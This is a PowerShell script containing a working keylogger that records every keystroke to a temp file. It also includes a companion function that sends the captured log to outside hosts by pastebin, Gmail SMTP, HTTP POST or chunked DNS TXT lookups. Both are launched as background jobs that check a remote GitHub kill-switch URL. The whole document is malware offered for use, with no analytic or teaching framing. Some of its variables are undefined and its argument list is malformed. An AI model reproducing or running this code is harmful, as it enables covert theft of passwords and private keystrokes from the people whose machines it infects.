$functions =  {


function script:Keylogger
{
    Param ( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $MagicString,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $CheckURL
    )
    
    $signature = @" 
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
"@ 
    $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru 
    $check = 0
    while ($true) 
    { 
        Start-Sleep -Milliseconds 40 
        $logged = "" 
        $result="" 
        $shift_state="" 
        $caps_state="" 
        for ($char=1;$char -le 254;$char++) 
        { 
            $vkey = $char 
            $logged = $getKeyState::GetAsyncKeyState($vkey) 
            if ($logged -eq -32767) 
            { 
                if(($vkey -ge 48) -and ($vkey -le 57)) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                        if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                        { 
                            $result = "S-" + $vkey 
                        } 
                        else 
                        { 
                            $result = $vkey 
                        } 
                    } 
                elseif(($vkey -ge 64) -and ($vkey -le 90)) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                    $caps_state = [console]::CapsLock 
                    if(!(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) -xor $caps_state) 
                    { 
                        $result = "S-" + $vkey 
                    } 
                    else 
                    { 
                        $result = $vkey 
                    } 
                } 
                elseif((($vkey -ge 186) -and ($vkey -le 192)) -or (($vkey -ge 219) -and ($vkey -le 222))) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                    if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                    { 
                        $result = "S-" + $vkey 
                    } 
                    else 
                    { 
                      $result = $vkey 
                    } 
                } 
                else 
                { 
                    $result = $vkey 
                } 
                $now = Get-Date; 
                $logLine = "$result " 
                $filename = "$env:temp\key.log" 
                Out-File -FilePath $fileName -Append -InputObject "$logLine" 

            }
        }
        $check++
        if ($check -eq 6000)
        {
            $webclient = New-Object System.Net.WebClient
            $filecontent = $webclient.DownloadString("$CheckURL")
            if ($filecontent -eq $MagicString)
            {
                break
            }
            $check = 0
        }
    }
}

    function Keypaste
    {
        Param ( 
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $ExfilOption,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [String]
            $dev_key,
        
            [Parameter(Position = 2, Mandatory = $True)]
            [String]
            $username,

            [Parameter(Position = 3, Mandatory = $True)]
            [String]
            $password,
        
            [Parameter(Position = 4, Mandatory = $True)]
            [String]
            $URL,

            [Parameter(Position = 5, Mandatory = $True)]
            [String]
            $AuthNS,

            [Parameter(Position = 6, Mandatory = $True)]
            [String]
            $MagicString,
        
            [Parameter(Position = 7, Mandatory = $True)]
            [String]
            $CheckURL
        )

        $check = 0
        while($true) 
        { 
            $read = 0
            Start-Sleep -Seconds 5 
            $pastevalue=Get-Content $env:temp\key.log 
            $read++
            if ($read -eq 30)
            {
                Out-File -FilePath $env:temp\key.log -Force -InputObject " " 
                $read = 0
            }
            $now = Get-Date; 
            $name = $env:COMPUTERNAME 
            $paste_name = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
            function post_http($url,$parameters) 
            { 
                $http_request = New-Object -ComObject Msxml2.XMLHTTP 
                $http_request.open("POST", $url, $false) 
                $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
                $http_request.setRequestHeader("Content-length", $parameters.length); 
                $http_request.setRequestHeader("Connection", "close") 
                $http_request.send($parameters) 
                $script:session_key=$http_request.responseText 
            } 

            function Compress-Encode
            {
                #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
                $ms = New-Object IO.MemoryStream
                $action = [IO.Compression.CompressionMode]::Compress
                $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
                $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
                $pastevalue | ForEach-Object {$sw.WriteLine($_)}
                $sw.Close()
                # Base64 encode stream
                $code = [Convert]::ToBase64String($ms.ToArray())
                return $code
            }

            if ($exfiloption -eq "pastebin")
            {
                $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
                $pastevalue = [System.Convert]::ToBase64String($utfbytes)
                post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
                post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
            }
        
            elseif ($exfiloption -eq "gmail")
            {
                #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
                $smtpserver = "smtp.gmail.com"
                $msg = new-object Net.Mail.MailMessage
                $smtp = new-object Net.Mail.SmtpClient($smtpServer )
                $smtp.EnableSsl = $True
                $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
                $msg.From = "$username@gmail.com"
                $msg.To.Add("$username@gmail.com")
                $msg.Subject = $pastename
                $msg.Body = $pastevalue
                if ($filename)
                {
                    $att = new-object Net.Mail.Attachment($filename)
                    $msg.Attachments.Add($att)
                }
                $smtp.Send($msg)
            }

            elseif ($exfiloption -eq "webserver")
            {
                $Data = Compress-Encode    
                post_http $URL $Data
            }
            elseif ($ExfilOption -eq "DNS")
            {
                $lengthofsubstr = 0
                $code = Compress-Encode
                $queries = [int]($code.Length/63)
                while ($queries -ne 0)
                {
                    $querystring = $code.Substring($lengthofsubstr,63)
                    Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $ExfilNS"
                    $lengthofsubstr += 63
                    $queries -= 1
                }
                $mod = $code.Length%63
                $query = $code.Substring($code.Length - $mod, $mod)
                Invoke-Expression "nslookup -querytype=txt $query.$DomainName $ExfilNS"

            }

            $check++
            if ($check -eq 6000)
            {
                $check = 0
                $webclient = New-Object System.Net.WebClient
                $filecontent = $webclient.DownloadString("$CheckURL")
                if ($filecontent -eq $MagicString)
                {
                    break
                }
            }
        }
    }

}
start-job -InitializationScript $functions -scriptblock {Keypaste [0] [1] [2] [3] [4] [5] [6] [7]} -ArgumentList @(null,null,null,null,null,null,stop,https://raw.githubusercontent.com/xingkong123600/TT/master/stop.txt)
start-job -InitializationScript $functions -scriptblock {Keylogger [0] [1]} -ArgumentList @(stop,https://raw.githubusercontent.com/xingkong123600/TT/master/stop.txt)
